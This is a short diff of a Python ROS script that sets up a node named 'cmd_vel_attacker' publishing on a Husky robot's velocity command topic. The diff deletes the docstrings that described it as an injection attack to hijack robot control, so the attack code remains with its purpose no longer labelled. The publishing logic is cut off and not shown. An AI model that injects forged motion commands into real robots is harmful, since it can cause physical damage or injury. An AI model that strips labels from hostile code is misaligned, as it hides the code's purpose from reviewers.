@@ -1,15 +1,11 @@
 #!/usr/bin/env python3
-"""
-CMD_VEL Topic Injection Attack
-Injects malicious velocity commands to hijack robot control
-"""
 
 import rospy
 from geometry_msgs.msg import Twist
 import sys
 
 def cmd_vel_attack():
-    """Execute CMD_VEL injection attack"""
+
     try:
         rospy.init_node('cmd_vel_attacker', anonymous=True)
         pub = rospy.Publisher('/husky_velocity_controller/cmd_vel', Twist, queue_size=10)
